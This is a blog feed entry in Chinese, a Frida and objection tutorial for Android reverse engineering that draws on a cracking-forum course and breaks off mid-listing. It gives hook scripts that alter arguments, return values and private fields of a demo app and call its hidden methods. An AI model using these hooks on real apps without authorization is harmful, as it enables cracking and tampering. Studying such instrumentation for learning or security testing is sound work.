<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>qianmu&#39;s blog</title>
  
  
  <link href="https://qianmuoy.github.io/atom.xml" rel="self"/>
  
  <link href="https://qianmuoy.github.io/"/>
  <updated>2024-03-18T14:24:46.434Z</updated>
  <id>https://qianmuoy.github.io/</id>
  
  <author>
    <name>qianmu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Frida</title>
    <link href="https://qianmuoy.github.io/2024/03/18/Frida/"/>
    <id>https://qianmuoy.github.io/2024/03/18/Frida/</id>
    <published>2024-03-18T14:24:28.000Z</published>
    <updated>2024-03-18T14:24:46.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h1><p>总体来自吾爱破解-正己的Frida篇教程</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>Frida 是一款开源的动态插桩工具，可以插入一些代码到原生App的内存空间去动态地监视和修改其行为，支持Windows、Mac、Linux、Android或者iOS，从安卓层面来讲，可以实现<code>Java</code>层和<code>Native</code>层<code>Hook</code>操作。</p><p>frida注入的原理就是找到目标进程,使用ptrace跟踪目标进程获取mmap，dlopen，dlsym等函数库的偏移获取mmap在目标进程申请一段内存空间将在目标进程中找到存放frida-agent-32&#x2F;64.so的空间启动执行各种操作由agent去实现</p><h2 id="插桩技术"><a href="#插桩技术" class="headerlink" title="插桩技术"></a>插桩技术</h2><p>frida使用的是<strong>动态二进制插桩技术</strong>（<strong>DBI</strong>），首先来了解一下插桩技术：</p><blockquote><p><em>插桩技术是指将额外的代码注入程序中以收集运行时的信息，可分为两种：</em><br>(1)源代码插桩[Source Code Instrumentation(SCI)]：顾名思义，在程序源代码的基础上增加（注入）额外的代码，从而达到预期目的或者功能；</p><p><img src="https://upload-images.jianshu.io/upload_images/16699345-1f9c315387387f81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/522/format/webp" alt="img"></p><p>源代码插桩实例</p></blockquote><p>(2)二进制插桩（Binary Instrumentation）：额外代码注入到二进制可执行文件中，通过修改汇编地址，改变程序运行内容，运行后再返回到原来程序运行出处，从而实现程序的额外功能。<br> ●静态二进制插桩[Static Binary Instrumentation(SBI)]：在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件。<br> ●动态二进制插桩[Dynamic Binary Instrumentation(DBI)]：在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变。*</p><p><strong>DBI能做什么？</strong></p><blockquote><p>（1）访问进程的内存<br>（2）在应用程序运行时覆盖一些功能<br>（3）从导入的类中调用函数<br>（4）在堆上查找对象实例并使用这些对象实例<br>（5）Hook，跟踪和拦截函数等等</p></blockquote><h2 id="注入的两种模式"><a href="#注入的两种模式" class="headerlink" title="注入的两种模式"></a>注入的两种模式</h2><ol><li>attach模式<br> attach到已经存在的进程，核心原理是ptrace修改进程内存，如果进程处于调试状态（traceid不等于0），则attach失败</li><li>spawn模式<br> 启动一个新的进程并挂起，在启动的同时注入frida代码，适用于在进程启动前的一些hook，如hook RegisterNative等，注入完成后调用resume恢复进程。</li></ol><table><thead><tr><th align="left">注入模式</th><th align="left">描述</th><th align="left">命令或参数</th><th align="left">优点</th><th align="left">主要用途</th></tr></thead><tbody><tr><td align="left">Spawn模式</td><td align="left">将启动App的权利交由Frida来控制，即使目标App已经启动，在使用Frida注入程序时还是会重新启动App</td><td align="left">在CLI模式中，Frida通过加上 -f 参数指定包名以spawn模式操作App</td><td align="left">适合于需要在App启动时即进行注入的场景，可以在App启动时即捕获其行为</td><td align="left">当需要监控App从启动开始的所有行为时使用</td></tr><tr><td align="left">Attach模式</td><td align="left">在目标App已经启动的情况下，Frida通过ptrace注入程序从而执行Hook的操作</td><td align="left">在CLI模式中，如果不添加 -f 参数，则默认会通过attach模式注入App</td><td align="left">适合于已经运行的App，不会重新启动App，对用户体验影响较小</td><td align="left">在App已经启动，或者我们只关心特定时刻或特定功能的行为时使用</td></tr></tbody></table><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install frida==12.8.0</span><br><span class="line">pip install frida-tools==5.3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pip install objection</span><br><span class="line">objection -h</span><br></pre></td></tr></table></figure><p>下载frida-server并解压(<a href="https://github.com/frida/frida/releases/download/12.8.0/frida-server-12.8.0-android-arm64.xz">https://github.com/frida/frida/releases/download/12.8.0/frida-server-12.8.0-android-arm64.xz</a>)</p><p>先adb shell，然后切换到root权限,把之前push进来的frida server改个名字叫fs，然后运行frida</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push /Users/sakura/Desktop/lab/alpha/tools/android/frida-server-12.8.0-android-arm64 /data/local/tmp</span><br><span class="line"><span class="built_in">chmod</span> +x fs</span><br><span class="line">./fs</span><br></pre></td></tr></table></figure><p>如果要监听端口，就</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fs -l 0.0.0.0:8888</span><br></pre></td></tr></table></figure><p>安装源代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/oleavr/frida-agent-example.git</span><br><span class="line"><span class="built_in">cd</span> frida-agent-example/</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><ol><li>使用vscode打开此工程，在agent文件夹下编写js，会有智能提示。</li><li><code>npm run watch</code>会监控代码修改自动编译生成js文件</li><li>python脚本或者cli加载_agent.js<br> <code>frida -U -f com.example.android --no-pause -l _agent.js</code></li></ol><h2 id="frida-server基本操作"><a href="#frida-server基本操作" class="headerlink" title="frida-server基本操作"></a>frida-server基本操作</h2><p><code>frida-ps -U</code>查看通过usb连接的android手机上的进程。</p><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><table><thead><tr><th align="left">API名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>Java.use(className)</code></td><td align="left">获取指定的Java类并使其在JavaScript代码中可用。</td></tr><tr><td align="left"><code>Java.perform(callback)</code></td><td align="left">确保回调函数在Java的主线程上执行。</td></tr><tr><td align="left"><code>Java.choose(className, callbacks)</code></td><td align="left">枚举指定类的所有实例。</td></tr><tr><td align="left"><code>Java.cast(obj, cls)</code></td><td align="left">将一个Java对象转换成另一个Java类的实例。</td></tr><tr><td align="left"><code>Java.enumerateLoadedClasses(callbacks)</code></td><td align="left">枚举进程中已经加载的所有Java类。</td></tr><tr><td align="left"><code>Java.enumerateClassLoaders(callbacks)</code></td><td align="left">枚举进程中存在的所有Java类加载器。</td></tr><tr><td align="left"><code>Java.enumerateMethods(targetClassMethod)</code></td><td align="left">枚举指定类的所有方法。</td></tr></tbody></table><table><thead><tr><th><code>console.log()</code></th><th>使用JavaScript直接进行日志打印</th><th>多用于在CLI模式中，<code>console.log()</code>直接输出到命令行界面，使用户可以实时查看。在RPC模式中，<code>console.log()</code>同样输出在命令行，但可能被Python脚本的输出内容掩盖。</th></tr></thead><tbody><tr><td><code>send()</code></td><td>Frida的专有方法，用于发送数据或日志到外部Python脚本</td><td>多用于RPC模式中，它允许JavaScript脚本发送数据到Python脚本，Python脚本可以进一步处理或记录这些数据。</td></tr></tbody></table><h3 id="Hook普通方法、打印参数和修改返回值"><a href="#Hook普通方法、打印参数和修改返回值" class="headerlink" title="Hook普通方法、打印参数和修改返回值"></a>Hook普通方法、打印参数和修改返回值</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个名为hookTest1的函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//获取一个名为&quot;类名&quot;的Java类，并将其实例赋值给JavaScript变量utils</span></span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">    <span class="comment">//修改&quot;类名&quot;的&quot;method&quot;方法的实现。这个新的实现会接收两个参数（a和b）</span></span><br><span class="line">    utils.<span class="property">method</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">            <span class="comment">//将参数a和b的值改为123和456。</span></span><br><span class="line">        a = <span class="number">123</span>;</span><br><span class="line">        b = <span class="number">456</span>;</span><br><span class="line">        <span class="comment">//调用修改过的&quot;method&quot;方法，并将返回值存储在`retval`变量中</span></span><br><span class="line">        <span class="keyword">var</span> retval = <span class="variable language_">this</span>.<span class="title function_">method</span>(a, b);</span><br><span class="line">        <span class="comment">//在控制台上打印参数a，b的值以及&quot;method&quot;方法的返回值</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, retval);</span><br><span class="line">        <span class="comment">//返回&quot;method&quot;方法的返回值</span></span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Hook重载参数"><a href="#Hook重载参数" class="headerlink" title="Hook重载参数"></a>Hook重载参数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .overload()</span></span><br><span class="line"><span class="comment">// .overload(&#x27;自定义参数&#x27;)</span></span><br><span class="line"><span class="comment">// .overload(&#x27;int&#x27;)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//overload定义重载函数，根据函数的参数类型填</span></span><br><span class="line">    utils.<span class="property">Inner</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.zj.wuaipojie.Demo$Animal&#x27;</span>,<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a，b</span>)&#123;</span><br><span class="line">        b = <span class="string">&quot;aaaaaaaaaa&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title class_">Inner</span>(a,b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Hook构造函数"><a href="#Hook构造函数" class="headerlink" title="Hook构造函数"></a>Hook构造函数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//修改类的构造函数的实现，$init表示构造函数</span></span><br><span class="line">    utils.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">        str = <span class="string">&quot;52&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.$init(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Hook字段"><a href="#Hook字段" class="headerlink" title="Hook字段"></a>Hook字段</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest5</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//静态字段的修改</span></span><br><span class="line">        <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//修改类的静态字段&quot;flag&quot;的值</span></span><br><span class="line">        utils.<span class="property">staticField</span>.<span class="property">value</span> = <span class="string">&quot;我是被修改的静态变量&quot;</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(utils.<span class="property">staticField</span>.<span class="property">value</span>);</span><br><span class="line">        <span class="comment">//非静态字段的修改</span></span><br><span class="line">        <span class="comment">//使用`Java.choose()`枚举类的所有实例</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">                    <span class="comment">//修改实例的非静态字段&quot;_privateInt&quot;的值为&quot;123456&quot;，并修改非静态字段&quot;privateInt&quot;的值为9999。</span></span><br><span class="line">                obj.<span class="property">_privateInt</span>.<span class="property">value</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">//字段名与函数名相同 前面加个下划线</span></span><br><span class="line">                obj.<span class="property">privateInt</span>.<span class="property">value</span> = <span class="number">9999</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Hook内部类"><a href="#Hook内部类" class="headerlink" title="Hook内部类"></a>Hook内部类</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//内部类</span></span><br><span class="line">        <span class="keyword">var</span> innerClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo$innerClass&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(innerClass);</span><br><span class="line">        innerClass.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;eeeeeeee&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="枚举所有的类与类的所有方法"><a href="#枚举所有的类与类的所有方法" class="headerlink" title="枚举所有的类与类的所有方法"></a>枚举所有的类与类的所有方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest7</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//枚举所有的类与类的所有方法,异步枚举</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">name,handle</span>)&#123;</span><br><span class="line">                    <span class="comment">//过滤类名</span></span><br><span class="line">                <span class="keyword">if</span>(name.<span class="title function_">indexOf</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>) !=-<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">                    <span class="keyword">var</span> clazz =<span class="title class_">Java</span>.<span class="title function_">use</span>(name);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(clazz);</span><br><span class="line">                    <span class="keyword">var</span> methods = clazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="枚举所有方法"><a href="#枚举所有方法" class="headerlink" title="枚举所有方法"></a>枚举所有方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest8</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Demo</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//getDeclaredMethods枚举所有方法</span></span><br><span class="line">        <span class="keyword">var</span> methods =<span class="title class_">Demo</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> methodName = methods[j].<span class="title function_">getName</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> k=<span class="number">0</span>; k&lt;<span class="title class_">Demo</span>[methodName].<span class="property">overloads</span>.<span class="property">length</span>;k++)&#123;</span><br><span class="line">                <span class="title class_">Demo</span>[methodName].<span class="property">overloads</span>[k].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="variable language_">arguments</span>.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">this</span>[methodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="主动调用"><a href="#主动调用" class="headerlink" title="主动调用"></a>主动调用</h3><p>静态方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">ClassName</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>); </span><br><span class="line"><span class="title class_">ClassName</span>.<span class="title function_">privateFunc</span>(<span class="string">&quot;传参&quot;</span>);</span><br></pre></td></tr></table></figure><p>非静态方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ret = <span class="literal">null</span>;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>,&#123;    <span class="comment">//要hook的类</span></span><br><span class="line">        <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            ret=instance.<span class="title function_">privateFunc</span>(<span class="string">&quot;aaaaaaa&quot;</span>); <span class="comment">//要hook的方法</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(&quot;result: &quot; + ret);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//return ret;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Objection"><a href="#Objection" class="headerlink" title="Objection"></a>Objection</h2><p>objection是基于frida的命令行hook集合工具, 可以让你不写代码, 敲几句命令就可以对java函数的高颗粒度hook, 还支持RPC调用。可以实现诸如内存搜索、类和模块搜索、方法hook打印参数返回值调用栈等常用功能，是一个非常方便的，逆向必备、内存漫游神器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python使用的版本建议大于3.8，不然可能会报错，或者你调低frida以及objection的版本</span></span><br><span class="line">pip install objection==1.11.0</span><br><span class="line">pip install frida-tools==9.2.4</span><br><span class="line">frida 14.2.18</span><br></pre></td></tr></table></figure><h3 id="上手"><a href="#上手" class="headerlink" title="上手"></a>上手</h3><p>命令注释</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">objection --<span class="built_in">help</span>(<span class="built_in">help</span>命令)</span><br><span class="line">Checking <span class="keyword">for</span> a newer version of objection...</span><br><span class="line">Usage: objection [OPTIONS] COMMAND [ARGS]...</span><br><span class="line"></span><br><span class="line">       _   _         _   _</span><br><span class="line">   ___| |_|_|___ ___| |_|_|___ ___</span><br><span class="line">  | . | . | | -_|  _|  _| | . |   |</span><br><span class="line">  |___|___| |___|___|_| |_|___|_|_|</span><br><span class="line">        |___|(object)inject(ion)</span><br><span class="line"></span><br><span class="line">       Runtime Mobile Exploration</span><br><span class="line">          by: @leonjza from @sensepost</span><br><span class="line"></span><br><span class="line">  默认情况下，通信将通过USB进行，除非提供了`--network`选项。</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line">  -N, --network            使用网络连接而不是USB连接。</span><br><span class="line">  -h, --host TEXT          [默认: 127.0.0.1]</span><br><span class="line">  -p, --port INTEGER       [默认: 27042]</span><br><span class="line">  -ah, --api-host TEXT     [默认: 127.0.0.1]</span><br><span class="line">  -ap, --api-port INTEGER  [默认: 8888]</span><br><span class="line">  -g, --gadget TEXT        要连接的Frida Gadget/进程的名称。 [默认: Gadget]</span><br><span class="line">  -S, --serial TEXT        要连接的设备序列号。</span><br><span class="line">  -d, --debug              启用带有详细输出的调试模式。(在堆栈跟踪中包括代&#123;过&#125;&#123;滤&#125;理源图)</span><br><span class="line">  --<span class="built_in">help</span>                   显示此消息并退出。</span><br><span class="line"></span><br><span class="line">命令:</span><br><span class="line">  api          以无头模式启动objection API服务器。</span><br><span class="line">  device-type  获取关于已连接设备的信息。</span><br><span class="line">  explore      启动objection探索REPL。</span><br><span class="line">  patchapk     使用frida-gadget.so补丁一个APK。</span><br><span class="line">  patchipa     使用FridaGadget dylib补丁一个IPA。</span><br><span class="line">  run          运行单个objection命令。</span><br><span class="line">  signapk      使用objection密钥对APK进行Zipalign和签名。</span><br><span class="line">  version      打印当前版本并退出。</span><br></pre></td></tr></table></figure><p>注入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">objection -g 包名 explore</span><br><span class="line"></span><br><span class="line">-   <span class="built_in">help</span>：不知道当前命令的效果是什么，在当前命令前加<span class="built_in">help</span>比如:<span class="built_in">help</span> <span class="built_in">env</span>，回车之后会出现当前命令的解释信息</span><br><span class="line">-   按空格：不知道输入什么就按空格，会有提示出来</span><br><span class="line">-   <span class="built_in">jobs</span>：可以进行多项hook</span><br><span class="line">-   日志：objection的日志文件生成在 C:\Users\Administrator\.objection</span><br></pre></td></tr></table></figure><p>启动前就hook</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g 进程名 explore --startup-command <span class="string">&quot;android hooking watch class 路径.类名&quot;</span></span><br></pre></td></tr></table></figure><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p>memory list modules  -查看内存中加载的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">memory list modules</span><br><span class="line">Save the output by adding `--json modules.json` to this <span class="built_in">command</span></span><br><span class="line">Name                                                              Base          Size                 Path</span><br><span class="line">----------------------------------------------------------------  ------------  -------------------  ------------------------------------------------------------------------------</span><br><span class="line">app_process64                                                     0x57867c9000  40960 (40.0 KiB)     /system/bin/app_process64</span><br><span class="line">linker64                                                          0x72e326a000  229376 (224.0 KiB)   /system/bin/linker64</span><br><span class="line">libandroid_runtime.so                                             0x72e164e000  2113536 (2.0 MiB)    /system/lib64/libandroid_runtime.so</span><br><span class="line">libbase.so                                                        0x72dfa67000  81920 (80.0 KiB)     /system/lib64/libbase.so</span><br><span class="line">libbinder.so                                                      0x72dec1c000  643072 (628.0 KiB)   